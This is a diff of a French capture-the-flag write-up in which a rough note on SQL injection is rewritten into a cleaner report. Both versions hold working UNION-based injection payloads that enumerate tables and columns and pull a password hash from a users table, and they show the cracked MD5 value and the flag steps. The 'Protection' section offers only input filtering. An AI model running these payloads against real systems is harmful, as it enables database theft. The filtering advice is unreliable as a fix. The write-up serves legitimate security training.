@@ -1,41 +1,35 @@
-# Vulnérabilité de Referer Spoofing (Falsification de Referer)
+# Vulnérabilité: Injection SQL
 
 ## Découverte
-Quand on tape n'importe quoi ca mets direcement une erreur SQl, ce qui veut dire que le champs est directement insere dans la requete.
 
-1 UNION SELECT table_name, NULL FROM information_schema.tables -- 
+En testant le formulaire, nous avons constaté qu'une erreur SQL s'affiche lorsqu'on entre des caractères spéciaux, indiquant que les entrées sont directement insérées dans les requêtes sans validation.
 
-```
-    1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 -- 
-```
-Lsite les columns de la DB
+### Exploitation
+Nous avons utilisé plusieurs requêtes UNION pour extraire des informations:
 
-Tester les differents fields :
-
-```
-    1 UNION SELECT Commentaire, NULL FROM 0x7573657273 --
+1. Identifier les tables:
+```sql
+1 UNION SELECT table_name, NULL FROM information_schema.tables --
 ```
 
-
-1 UNION SELECT countersign, NULL FROM users WHERE user_id=5 --
-1 UNION SELECT Commentaire, NULL FROM users WHERE user_id=5 --
-1 UNION SELECT country, NULL FROM users WHERE user_id=5 --
-1 UNION SELECT town, NULL FROM users WHERE user_id=5 --
-
-1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 -- 
-```
-ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --  
-First name: one
-Surname : me
-ID: 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --  
-First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-Surname : 5ff9d0165b4f92b14994e5c685cdce28
+2. Identifier les colonnes:
+```sql
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x7573657273 --
 ```
 
-On prend la clef comme dit si dessous 128 bits donc hash md5 qui  est egale a FortyTwo 
+3. Extraction des données sensibles:
+```sql
+1 UNION SELECT Commentaire, countersign FROM users WHERE user_id=5 --
+```
 
-on encrypte fortytwio en minuscule en .sha256 et ca donne le flag a trouver
+### Résultat
+Nous avons obtenu:
+- First name: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
+- Surname: `5ff9d0165b4f92b14994e5c685cdce28`
 
+Le hash MD5 `5ff9d0165b4f92b14994e5c685cdce28` correspond à `FortyTwo`.
+En suivant les instructions, nous avons converti `fortytwo` en minuscules puis appliqué SHA256 pour obtenir le flag.
 
 ## Protection
-Il faut verifier si il n'y a pas e SQL dans les requetes si on les inseres apres dans les requetes sql 
+- Implémenter une validation des entrées côté serveur
+- Filtrer les caractères spéciaux SQL
